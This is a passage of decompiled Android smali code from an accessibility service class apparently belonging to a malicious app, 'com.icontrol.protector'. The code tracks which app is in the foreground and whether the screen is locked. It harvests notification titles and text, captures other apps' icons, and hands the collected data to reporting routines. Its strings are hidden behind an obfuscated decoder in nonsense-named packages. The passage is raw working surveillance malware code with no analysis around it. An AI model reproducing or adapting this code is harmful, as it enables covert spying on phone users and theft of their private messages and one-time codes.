    invoke-virtual {v7, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/KeyguardManager;

    invoke-virtual {v1}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z

    move-result v1

    if-eqz v13, :cond_33

    if-nez v1, :cond_33

    sget-object v1, Lcom/icontrol/protector/a;->c:Ljava/util/ArrayList;

    invoke-virtual {v1, v13}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v1
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_c

    if-eqz v1, :cond_32

    :try_start_15
    invoke-virtual/range {p0 .. p0}, Lcom/icontrol/protector/AccessServices;->m()V
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_10

    goto :goto_1a

    :catch_10
    move-exception v0

    move-object v1, v0

    :try_start_16
    new-array v2, v15, [B

    fill-array-data v2, :array_ba

    new-array v3, v9, [B

    fill-array-data v3, :array_bb

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    :goto_19
    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_c

    goto :goto_1a

    :cond_32
    :try_start_17
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1, v13}, Lcom/icontrol/protector/a;->N(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_33

    invoke-virtual/range {p0 .. p0}, Lcom/icontrol/protector/AccessServices;->j()V
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_11

    goto :goto_1a

    :catch_11
    move-exception v0

    move-object v1, v0

    :try_start_18
    new-array v2, v15, [B

    fill-array-data v2, :array_bc

    new-array v3, v9, [B

    fill-array-data v3, :array_bd

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    goto :goto_19

    :cond_33
    :goto_1a
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->X:Ljava/lang/String;

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_34

    sget-object v1, Lcom/icontrol/protector/a;->g:Ljava/util/List;

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v1

    if-gtz v1, :cond_35

    :cond_34
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/16 v2, 0x9

    new-array v4, v2, [B

    fill-array-data v4, :array_be

    new-array v2, v9, [B

    fill-array-data v2, :array_bf

    invoke-static {v4, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_40

    :cond_35
    if-eqz v14, :cond_40

    new-array v1, v9, [B

    fill-array-data v1, :array_c0

    new-array v2, v9, [B

    fill-array-data v2, :array_c1

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_c

    :try_start_19
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_37

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_36

    const/16 v2, 0x24

    new-array v2, v2, [B

    fill-array-data v2, :array_c2

    new-array v3, v9, [B

    fill-array-data v3, :array_c3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_12

    if-eqz v2, :cond_37

    :cond_36
    return-void

    :cond_37
    :goto_1b
    move-object v15, v1

    goto :goto_1c

    :catch_12
    :try_start_1a
    new-array v1, v9, [B

    fill-array-data v1, :array_c4

    new-array v2, v9, [B

    fill-array-data v2, :array_c5

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto :goto_1b

    :goto_1c
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    if-eqz v1, :cond_38

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v8

    :cond_38
    invoke-static {}, Lcom/icontrol/protector/a;->L()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    move-object v2, v11

    :cond_39
    :goto_1d
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_3a

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/icontrol/protector/a$e;

    iget-object v4, v3, Lcom/icontrol/protector/a$e;->a:Ljava/lang/String;

    invoke-virtual {v4, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_39

    move-object v2, v3

    goto :goto_1d

    :cond_3a
    if-eqz v2, :cond_3c

    invoke-static {v14, v2}, Lcom/icontrol/protector/a;->x(Landroid/view/accessibility/AccessibilityNodeInfo;Lcom/icontrol/protector/a$e;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_3b

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const/16 v3, 0x9

    new-array v4, v3, [B

    fill-array-data v4, :array_c6

    new-array v3, v9, [B

    fill-array-data v3, :array_c7

    invoke-static {v4, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v2, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_3b

    iget-object v2, v7, Lcom/icontrol/protector/AccessServices;->b:Ljava/lang/String;

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_3b

    iput-object v1, v7, Lcom/icontrol/protector/AccessServices;->b:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v14, 0x1

    new-array v3, v14, [B

    const/16 v4, -0x13

    aput-byte v4, v3, v18

    new-array v4, v9, [B

    fill-array-data v4, :array_c8

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v3, v14, [B

    const/16 v4, 0x53

    aput-byte v4, v3, v18

    new-array v4, v9, [B

    fill-array-data v4, :array_c9

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lcom/icontrol/protector/b$b;->g:Lcom/icontrol/protector/b$b;

    invoke-static {v2, v3}, Lcom/icontrol/protector/b;->c(Ljava/lang/String;Lcom/icontrol/protector/b$b;)V

    const/16 v6, 0xd

    new-array v2, v6, [B

    fill-array-data v2, :array_ca

    new-array v3, v9, [B

    fill-array-data v3, :array_cb

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v5, 0x6

    new-array v3, v5, [B

    fill-array-data v3, :array_cc

    new-array v4, v9, [B

    fill-array-data v4, :array_cd

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v3, 0x5

    new-array v4, v3, [B

    fill-array-data v4, :array_ce

    new-array v3, v9, [B

    fill-array-data v3, :array_cf

    invoke-static {v4, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v2, v6, [B

    fill-array-data v2, :array_d0

    new-array v3, v9, [B

    fill-array-data v3, :array_d1

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v4, 0x9

    new-array v4, v4, [B

    fill-array-data v4, :array_d2

    new-array v5, v9, [B

    fill-array-data v5, :array_d3

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v7, v2, v3}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_c

    goto :goto_1e

    :cond_3b
    const/16 v6, 0xd

    const/4 v14, 0x1

    goto :goto_1e

    :cond_3c
    const/16 v6, 0xd

    const/4 v14, 0x1

    move-object v1, v11

    :goto_1e
    :try_start_1b
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->X:Ljava/lang/String;

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v2, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_40

    if-nez v1, :cond_3d

    new-array v1, v9, [B

    fill-array-data v1, :array_d4

    new-array v2, v9, [B

    fill-array-data v2, :array_d5

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    :cond_3d
    move-object/from16 v16, v1

    sget-object v1, Lcom/icontrol/protector/a;->h:Ljava/util/Map;

    invoke-interface {v1}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v17

    :goto_1f
    invoke-interface/range {v17 .. v17}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_40

    invoke-interface/range {v17 .. v17}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/util/Map$Entry;
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_17

    :try_start_1c
    invoke-interface {v1}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    invoke-interface {v1}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v1

    move-object v4, v1

    check-cast v4, Ljava/lang/String;

    sget-object v1, Lcom/icontrol/protector/a;->i:Ljava/util/Map;

    invoke-interface {v1, v2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual/range {v16 .. v16}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v4}, Lcom/icontrol/protector/a;->M(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_3f

    if-eqz v1, :cond_3e

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_13

    if-eqz v1, :cond_3e

    goto :goto_20

    :catch_13
    :cond_3e
    const/16 v26, 0x90

    goto :goto_23

    :cond_3f
    :goto_20
    :try_start_1d
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v1, v8}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1
    :try_end_1d
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1d .. :try_end_1d} :catch_14
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_13

    :goto_21
    const/16 v5, 0x90

    goto :goto_22

    :catch_14
    move-exception v0

    move-object v1, v0

    :try_start_1e
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_13

    move-object v1, v11

    goto :goto_21

    :goto_22
    :try_start_1f
    invoke-static {v1, v5, v5}, Lcom/icontrol/protector/n;->t(Landroid/graphics/drawable/Drawable;II)Landroid/graphics/Bitmap;

    move-result-object v3

    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_15

    const/16 v5, 0x64

    :try_start_20
    invoke-virtual {v3, v1, v5, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v19

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {v7, v8}, Lcom/icontrol/protector/n;->z(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v22

    new-instance v1, Ljava/util/Timer;

    invoke-direct {v1}, Ljava/util/Timer;-><init>()V

    new-instance v11, Lcom/icontrol/protector/AccessServices$c;
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_13

    move-object v14, v1

    move-object v1, v11

    move-object/from16 v24, v2

    move-object/from16 v2, p0

    move-object/from16 v25, v3

    move-object v3, v5

    const/16 v26, 0x90

    move-object/from16 v5, v22

    move-object/from16 v6, v19

    :try_start_21
    invoke-direct/range {v1 .. v6}, Lcom/icontrol/protector/AccessServices$c;-><init>(Lcom/icontrol/protector/AccessServices;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;[B)V

    const-wide/16 v1, 0x4b0

    invoke-virtual {v14, v11, v1, v2}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    invoke-virtual/range {v25 .. v25}, Landroid/graphics/Bitmap;->recycle()V

    invoke-virtual/range {v24 .. v24}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_16

    goto :goto_23

    :catch_15
    move/from16 v26, v5

    :catch_16
    :goto_23
    const/16 v6, 0xd

    const/4 v11, 0x0

    const/4 v14, 0x1

    goto/16 :goto_1f

    :catch_17
    :cond_40
    :try_start_22
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_c

    const/16 v2, 0x40

    if-ne v1, v2, :cond_45

    :try_start_23
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/16 v2, 0x11

    new-array v2, v2, [B

    fill-array-data v2, :array_d6

    new-array v3, v9, [B

    fill-array-data v3, :array_d7

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    new-array v4, v9, [B

    fill-array-data v4, :array_d8

    new-array v5, v9, [B

    fill-array-data v5, :array_d9

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-nez v1, :cond_41

    if-eqz v2, :cond_45

    :cond_41
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getParcelableData()Landroid/os/Parcelable;

    move-result-object v3

    check-cast v3, Landroid/app/Notification;

    if-eqz v3, :cond_45

    const/4 v4, 0x3

    new-array v5, v4, [B

    fill-array-data v5, :array_da

    new-array v4, v9, [B

    fill-array-data v4, :array_db

    invoke-static {v5, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    iget-object v5, v3, Landroid/app/Notification;->extras:Landroid/os/Bundle;
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_1b

    const/16 v6, 0xd

    :try_start_24
    new-array v8, v6, [B

    fill-array-data v8, :array_dc

    new-array v11, v9, [B

    fill-array-data v11, :array_dd

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v5, v8}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v5

    if-eqz v5, :cond_42

    iget-object v4, v3, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    new-array v5, v6, [B

    fill-array-data v5, :array_de

    new-array v8, v9, [B

    fill-array-data v8, :array_df

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    :cond_42
    const/4 v5, 0x3

    goto :goto_25

    :catch_18
    move-exception v0

    :goto_24
    move-object v1, v0

    goto/16 :goto_27

    :goto_25
    new-array v5, v5, [B

    fill-array-data v5, :array_e0

    new-array v8, v9, [B

    fill-array-data v8, :array_e1

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    iget-object v8, v3, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const/16 v11, 0xc

    new-array v14, v11, [B

    fill-array-data v14, :array_e2

    new-array v11, v9, [B

    fill-array-data v11, :array_e3

    invoke-static {v14, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v8, v11}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v8

    if-eqz v8, :cond_43

    iget-object v3, v3, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const/16 v5, 0xc

    new-array v5, v5, [B

    fill-array-data v5, :array_e4

    new-array v8, v9, [B

    fill-array-data v8, :array_e5

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    :cond_43
    if-eqz v1, :cond_44

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v3, 0x1

    new-array v8, v3, [B

    const/16 v3, 0x4a

    aput-byte v3, v8, v18

    new-array v3, v9, [B

    fill-array-data v3, :array_e6

    invoke-static {v8, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v3, 0x1

    new-array v8, v3, [B

    const/16 v3, -0x46

    aput-byte v3, v8, v18

    new-array v3, v9, [B

    fill-array-data v3, :array_e7

    invoke-static {v8, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v3, 0x1

    new-array v8, v3, [B

    const/16 v3, -0x3c

    aput-byte v3, v8, v18

    new-array v3, v9, [B

    fill-array-data v3, :array_e8

    invoke-static {v8, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_18

    :try_start_25
    sget-object v3, Lcom/icontrol/protector/b$b;->i:Lcom/icontrol/protector/b$b;

    invoke-static {v1, v3}, Lcom/icontrol/protector/b;->c(Ljava/lang/String;Lcom/icontrol/protector/b$b;)V
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_19

    goto :goto_26

    :catch_19
    move-exception v0

    move-object v1, v0

    :try_start_26
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_44
    :goto_26
    if-eqz v2, :cond_45

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v2, 0x1

    new-array v2, v2, [B

    const/16 v3, -0x6b

    aput-byte v3, v2, v18

    new-array v3, v9, [B

    fill-array-data v3, :array_e9

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1
    :try_end_26
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_26} :catch_18

    :try_start_27
    invoke-static {v7, v1, v5}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_27
    .catch Ljava/lang/Exception; {:try_start_27 .. :try_end_27} :catch_1a

    goto :goto_28

    :catch_1a
    move-exception v0

    move-object v1, v0

    :try_start_28
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_28
    .catch Ljava/lang/Exception; {:try_start_28 .. :try_end_28} :catch_18

    goto :goto_28

    :catch_1b
    move-exception v0

    const/16 v6, 0xd

    goto/16 :goto_24

    :goto_27
    :try_start_29
    new-array v2, v6, [B

    fill-array-data v2, :array_ea

    new-array v3, v9, [B

    fill-array-data v3, :array_eb

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_45
    :goto_28
    invoke-virtual {v12}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_48

    sget-object v1, Lcom/icontrol/protector/AccessServices;->r:Ljava/lang/String;

    invoke-virtual {v1, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_48

    const/4 v1, 0x5

    new-array v2, v1, [B

    fill-array-data v2, :array_ec

    new-array v1, v9, [B

    fill-array-data v1, :array_ed

    invoke-static {v2, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v12, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_29} :catch_c

    if-nez v1, :cond_48

    :try_start_2a
    sget-object v1, Lcom/icontrol/protector/AccessServices;->r:Ljava/lang/String;

    const/4 v2, 0x5

    new-array v2, v2, [B

    fill-array-data v2, :array_ee

    new-array v3, v9, [B

